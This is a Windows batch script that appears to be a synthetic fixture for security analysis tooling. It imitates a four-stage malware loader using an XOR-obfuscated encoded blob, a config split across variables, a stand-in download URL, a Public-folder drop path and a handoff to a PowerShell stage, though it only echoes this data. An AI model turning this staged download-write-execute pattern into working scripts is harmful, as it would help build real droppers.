@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|xor_5a
rem HUNTRESS-MATERIAL:==wapoCd4s2aixDbtl2O5c3P9sjLpc2P9sjLpUgLi8DNm4yO+QHOrtmY8wWbptTO39TP74SKGgzOWkSK/giL08iEGkzM2gzLKYQKo8TKPYAYZcmMusjKF8jNzwjJusjP09zO74jP+kDb15zM2sDL0MDd/YjK3sjI/QHOrtmY8wWbptTO1VHYpoiLuIzZ2gyLmgzarJGPs1Wa7kzd00zM7oyN7kzZ+MTB00zM7oyN7kjJ2YzPykCK/0SNqc2P9szL9QzO2UgLi8DNmgyO/QzM2cmMqsDK9Yibn5CNvUTOF8TP74SKm8jI/QnP3kzZo8jLqsjP7YiLqMDK5kSB8wTN+QzOyYXKp8TO1giKFITOusjKpMjP29jNzwTB/4yMo0id/4SN38DKF8DKz8yK5szZpoyPukiJrdGL
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "item0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=cm"& rem HUNTRESS quote compound
set "item1=d.exe|stage_count=4|graph=linear|next_language=powershell|campaign_id=campaign"& rem HUNTRESS quote compound
set "item2=-ca376f811b|url=https://ca376f811b.example.invalid/6cdddaae.dat|file_path=C:\U"& rem HUNTRESS quote compound
set "item3=sers\Public\HuntressLab\stage-ca376f811b.dat|next_stage=stage-ca376f811b.ps1"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=ab69a474"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "item9="
for %%G in (0 1 2 3) do call set "item9=%%item9%%%%item%%G%%"
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo cmd.exe acquire, write, dispatch, and hand off stage-ca376f811b.ps1
exit /b 0
